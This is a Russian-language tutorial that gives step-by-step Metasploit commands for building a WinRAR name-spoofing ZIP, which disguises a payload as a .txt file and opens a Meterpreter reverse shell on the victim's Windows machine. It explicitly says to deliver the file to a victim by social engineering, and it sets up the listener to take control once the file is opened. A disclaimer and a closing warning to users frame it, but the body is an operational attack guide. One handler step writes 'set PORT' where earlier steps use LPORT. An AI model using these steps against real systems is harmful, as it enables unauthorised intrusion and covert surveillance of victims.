# Взлом Windows при помощи файла с текстом
Доброго времени суток! Сегодня расскажем о том, как получить доступ к любой системе, при помощи текстового файлы, архива и невнимательного пользователя.

**Дисклеймер. Автор статьи не несёт ответственности за действия, описываемые в данной статье. Всё что показано, сделано в сугубо образовательных целях. Делайте всё на свой страх и риск.**

### Как работает сам «взлом»?

Здесь используется уязвимость **winrar_name_spoofing** для нацеливания на Windows и создания обратной оболочки. Мы будем использовать эту уязвимость для эксплуатации компьютера с Windows 10, с помощью платформы Metasploit.

Будем создавать вредоносный ZIP-файл, а внутри zip-файла файл полезной нагрузки (вирус) будет скрыт в виде файла формата .txt

Когда наша жертва открывает этот файл, сеанс meterpreter будет установлен с атакующей машиной.
### Шаги по созданию полезной нагрузки

Шаг 1: Откройте терминал Kali Linux и запустите платформу [Metasploit,](https://vk.com/away.php?to=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FMetasploit_Project&cc_key=) используя следующую команду:
```msfconsole```
Шаг 2. После открытия **msfconsole** введите следующую команду, чтобы выбрать уязвимость **winrar_name_spoofing.**
```use exploit/windows/fileformat/winrar_name_spoofing```
Шаг 3: Теперь вы можете ввести команду **show options**, чтобы показать все доступные параметры, которые можно использовать:
```show options```
Шаг 4: Нам нужно установить имя вредоносного файла и имя поддельного файла, который будет скрыт внутри ZIP

Введите следующие команды:
```
set FILENAME funnyvideo.zip
set SPOOF password.txt
```
Шаг 5: Теперь нам нужно установить LHOST и LPORT в Metasploit. Поскольку мы используем эксплойт Windows в своей локальной сети (LAN), мы укажем свой локальный IP-адрес и LPORT как 4444.

Если бы вы использовали Ngrok или NOIP , вы бы использовали соответствующие IP-адреса.

Запустите команды
```
set LHOST 192.168.20.128
set LPORT 4444
```
Шаг 6: Теперь нужно установить «прослушку» для полезной нагрузки, для этого выполните следующую команду в терминале kali Linux:
```set payload windows/meterpreter/reverse_tcp```
Шаг 7: Теперь введите **exploit**, после чего файл с именем funnyvideo.zip будет создан в папке /root/.msf4/local/funnyvideo.zip.
Шаг 8: Скопируйте вредоносный файл и отправьте его жертве при помощи социальной инженерии.

### Смотрим результаты

Сейчас мы будем получать "обратку" от нашей полезной нагрузки Windows. Это поможет нам контролировать систему с помощью эксплойта Windows.

Шаг 1: Введите следующую команду, чтобы использовать обработчик Metasploit.
```use exploit/multi/handler```
Шаг 2: Теперь нам нужно установить полезную нагрузку, для этого нам нужно запустить следующую команду:
```set payload windows/meterpreter/reverse_tcp```
Шаг 3: Установите LHOST и LPORT. Обратите внимание, что они должны совпадать с созданным вами вредоносным файлом.

set LHOST 192.168.20.128
set PORT 4444

Шаг 4: Теперь введите exploit в терминале, и ваш эксплойт запустится.

exploit
Шаг 5: Вам просто нужно подождать, пока цель откроет файл, и вуаля, вы получили доступ в её систему.

Абсолютно никак не напрягаясь, мы можем получить доступ к реальной системе невнимательного пользователя. Даже современные операционные системы не дают такого уровня защиты, который бы полностью уберег конечного пользователя от вирусов и последующей скрытой слежки за ним. Главный антивирус сидит перед экраном монитора, поэтому важно с крайней осторожностью открывать незнакомые файлы